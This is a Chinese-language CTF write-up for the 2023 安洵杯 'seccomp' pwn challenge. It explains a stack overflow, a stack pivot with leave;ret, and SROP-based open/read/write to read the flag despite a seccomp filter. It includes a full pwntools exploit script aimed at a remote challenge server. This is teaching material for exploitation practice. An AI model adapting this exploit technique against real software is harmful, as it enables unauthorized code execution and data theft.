
#wp #pwn

【[[pwn]]】【pwn】seccomp - [[题目扩展]]

创建时间：2025-07-12 22:40

### 解题过程

参考wp：[2023-安洵杯-Pwn | 晚栀wingee~](http://47.96.29.144/2023/12/23/2023D0g3Pwn/)

# 2023-安洵杯-Pwn    Seccomp


## 一、题目背景和初步分析

1. **程序交互**
    
    - **启动第一行** 会打印 `easyhack\n`。
        
    - 然后会执行 `read(0, .bss, 0x1000)`，把你输入的数据读到可写的 `.bss` 段。
        
    - 打印 `Do u know what is SUID?` 后，再次 `read`（栈上读入），这次会发生栈溢出。
        
2. **安全机制**
    
    - **NX**（不可执行栈）：不能直接往栈上写 shellcode 并跑。
        
    - **No canary**：虽然栈上没有 cookie，但 NX 生效，所以必须用 ROP 技术来跑代码。
        
    - **Full RELRO、No PIE**：函数 GOT 已写保护，程序基址固定 (`0x400000`)，我们可以直接用硬编码地址。
        
    - **seccomp 过滤**：只允许 `read, write, open, rt_sigreturn, chmod` 等少数系统调用。**不能** 直接调用 `execve("/bin/sh")`。
        
3. **解法思路**
    
    - **ORW**：Open-Read-Write 拿到 flag，而不是拿 shell。
        
    - **SROP**（Sigreturn Oriented Programming）：利用 `rt_sigreturn` 把任意寄存器状态（包括 `rax/rdi/rsi/rdx`）恢复到我们指定的值，然后紧跟一个 `syscall` 指令，触发我们想要的系统调用。
        
    - **Stack Pivot（栈迁移）**：因为第二次读栈溢出只能改 RBP+RIP，于是用 `leave; ret` 把栈指针切换到我们事先写好的 ROP 链所在的 `.bss`。
        

---

## 二、关键 Gadget 与地址

在开始写脚本前，我们需要用 `ROPgadget`（或 `objdump -d`）在 `chall` 里找出三个最常用的 gadget：

|功能|Gadget 汇编|偏移（示例）|
|---|---|---|
|**mov rax,15; ret**|`mov rax,0xf; ret`|`0x401193`|
|**syscall; pop rbp; ret**|`syscall; nop; pop rbp; ret`|`0x40118a`|
|**leave; ret**|`leave; ret`|`0x40136c`|

- `mov rax,0xf; ret`：先把 `rax=15`（`SYS_rt_sigreturn`），然后 `ret` 到下一个 gadget，触发信号返回。
    
- `syscall; pop rbp; ret`：执行一次系统调用，然后做一次 `pop rbp; ret`，配合 SROP 恢复寄存器状态。
    
- `leave; ret`：等同于
    
    asm
    
    复制编辑
    
    `mov rsp, rbp pop rbp ret`
    
    用它把栈迁移到我们自己控制的内存区。
    

再来看段地址（`readelf -S chall`）：

- **`.bss` 段起始**：`0x404020`
    
- 我们会把整个 ROP+SROP 链写到这里。
    

---

## 三、利用流程拆解

### 1. 初始 Read → 写入 ROP+SROP 链

程序第一次 `read(0, .bss, 0x1000)`，把我们构造的 payload 写到 `.bss`。  
**Payload 构成**：

csharp

复制编辑

`[flag_name (8 bytes)]   <-- 放字符串 "flag\0" [padding 到 chain_addr] <-- 对齐到链的起始 [chain (可控 ROP+SROP)]`

- `flag_name`：我们把 `"flag\0"` 放在 `.bss` 起始（`0x404020`）。
    
- `chain_addr`：我们从 `.bss+0x100` 开始存放真正的 ROP+SROP 链，以免和前面的数据冲突。
    

### 2. 构造三段 SROP Frame：open / read / write

在 chain 里，我们依次做三件事：

1. **open("./flag", O_RDONLY)**
    
2. **read(fd=3, buf, 0x100)**
    
3. **write(1, buf, 0x100)**
    

每一段都通过下面这个套路触发信号返回并执行 syscall：

python

复制编辑

`# 伪代码 chain += p64(0)              # 对应 syscall; pop rbp; ret 的 pop rbp chain += p64(pop_rax)        # mov rax, 15; ret chain += p64(syscall_ret)    # syscall → rt_sigreturn chain += bytes(frame)        # SigreturnFrame 里填好 rax/rdi/rsi/rdx/rip=rwx ...`

- `bytes(frame)` 是 pwntools 提供的，将我们设置好的 `rax/rdi/...` 序列化成给内核的 `struct sigcontext`。
    
- 我们还要计算好每个 `frame.rsp`，让它在返回后把链跳到下一段。
    

### 3. 第二次 Read → 栈溢出 + Pivot

第二次 `read` 读入栈上的 buffer，有 **固定偏移**：

css

复制编辑

`[ buffer (32 bytes) ]    ← 用户输入覆盖到这里 [ saved RBP (8 bytes) ]  ← 可控：写入 chain_addr [ saved RIP (8 bytes) ]  ← 可控：写入 leave_ret gadget`

因此，我们发送：

python

复制编辑

`pivot = b"A"*32           # 填满 buffer pivot += p64(chain_addr)  # 新的 RBP pivot += p64(leave_ret)   # leave; ret p.send(pivot)`

当这次 `read` 返回后，函数会 `leave; ret`，也就是：

1. `mov rsp, rbp` → `rsp = chain_addr`
    
2. `pop rbp` → 把原来写的 `chain_addr` 弹到寄存器 RBP
    
3. `ret` → 跳到 chain_addr 上的第一条 ROP 指令
    

这样，栈就指向了我们在第一阶段写好的 ROP+SROP 链。

### 4. 链式执行，拿到 flag

在 chain_addr 上，我们先触发 **SROP**（`rt_sigreturn`）进入第 1 段 Frame，执行 `open`；再通过 `pop rbp` 保持链的连续；依次完成 `read` 和 `write`。最后，`write(1, buf, 0x100)` 会把 flag 的内容直接打印到标准输出，程序自然退出。

---

## 四、完整可跑的 Exploit 代码（注释版）

python

复制编辑

`#!/usr/bin/env python3 from pwn import *  # —— 环境 & ELF 加载 ————————————————————————— context(os='linux', arch='amd64', log_level='debug') elf = ELF('./chall') libc= ELF('./libc.so.6') ld  = ELF('./ld-linux-x86-64.so.2')  if args.LOCAL:     # 本地调试：预加载给定 libc/ld     p = process([ld.path, elf.path], env={'LD_PRELOAD': libc.path}) else:     # 远程靶机     p = remote('110.42.47.169', 35589)  # —— 消耗首个提示 ——   p.recvuntil(b'easyhack\n')  # —— 常用 Gadget & 段地址 ————————————————————— pop_rax     = 0x401193       # mov rax,15; ret syscall_ret = 0x40118a       # syscall; nop; pop rbp; ret leave_ret   = 0x40136c       # leave; ret  bss         = elf.bss()      # 0x404020 flag_name   = bss            # 我们放 "flag\0" 的地方 flag_buf    = flag_name + 8  # read 后把 flag 放在这里 chain_addr  = bss + 0x100    # 真实 ROP+SROP 链的起始  # —— 第1阶段 Payload：写 “flag\0” + SROP 链 到 .bss ————— payload  = b'flag\x00'.ljust(8, b'\x00') payload  = payload.ljust(chain_addr - bss, b'\x00')  frames = []  # ——— 段1：open("./flag", O_RDONLY) f = SigreturnFrame() f.rax = constants.SYS_open f.rdi = flag_name f.rsi = 0 f.rdx = 0 f.rip = syscall_ret frames.append(f)  # ——— 段2：read(3, flag_buf, 0x100) f = SigreturnFrame() f.rax = constants.SYS_read f.rdi = 3 f.rsi = flag_buf f.rdx = 0x100 f.rip = syscall_ret frames.append(f)  # ——— 段3：write(1, flag_buf, 0x100) f = SigreturnFrame() f.rax = constants.SYS_write f.rdi = 1 f.rsi = flag_buf f.rdx = 0x100 f.rip = syscall_ret frames.append(f)  # —— 计算 rsp 并拼链 ————————————————————————— offset = 0 chain  = b'' for frm in frames:     seglen = (8   # dummy for pop rbp             + 8   # mov rax,15; ret             + 8   # syscall; pop rbp; ret             + len(bytes(frm)))     offset   += seglen     frm.rsp   = chain_addr + offset      # 真正拼接     chain    += p64(0)           # 补 pop rbp     chain    += p64(pop_rax)     chain    += p64(syscall_ret)     chain    += bytes(frm)  payload += chain  # —— 发送第1阶段 Payload —————————————————————— p.send(payload)  # —— 消耗第二个提示 ——   p.recvuntil(b'Do u know what is SUID?')  # —— 第2阶段 Pivot —— 32字节到 saved RBP pivot  = b'A' * 32 pivot += p64(chain_addr)  # 新的 RBP pivot += p64(leave_ret)   # leave; ret p.send(pivot)  # —— 最终接收 flag ——  # write(1, flag_buf, 0x100) 会把它直接输出来 flag = p.recv(0x100) print(">> FLAG:", flag.decode('ascii', errors='ignore'))`

---

## 五、核心知识点回顾

1. **SROP（Sigreturn Oriented Programming）**：
    
    - 利用 `SYS_rt_sigreturn` 恢复任意寄存器状态（包括 `rax/rdi/rsi/rdx`）
        
    - 在内核帮你 restore 之后，`rip` 指向真正的 `syscall` gadget，就可以直接发系统调用。
        
2. **ORW（Open-Read-Write）**：
    
    - 受限于 seccomp，不能 `execve`，只好用 `open`→`read`→`write` 的三步拿 flag。
        
3. **栈 pivot（leave; ret）**：
    
    - 通过 `saved RBP/RIP` 把栈指向 `.bss`，让我们在可写区域执行任意 ROP。
        
4. **pwntools SigreturnFrame**：
    
    - 方便地构造 `struct sigcontext`，只要给 `.rax/.rdi/.rsi/.rdx/.rip/.rsp` 赋值，`bytes(frame)` 就是内核需要的格式。
        
5. **偏移计算**：
    
    - 第一次 `read(0, .bss, 0x1000)` 给了我们大空间来存放链。
        
    - 第二次 `read` 固定只能覆盖 32 字节 buffer + 8 字节 RBP + 8 字节 RIP → 写入 pivot。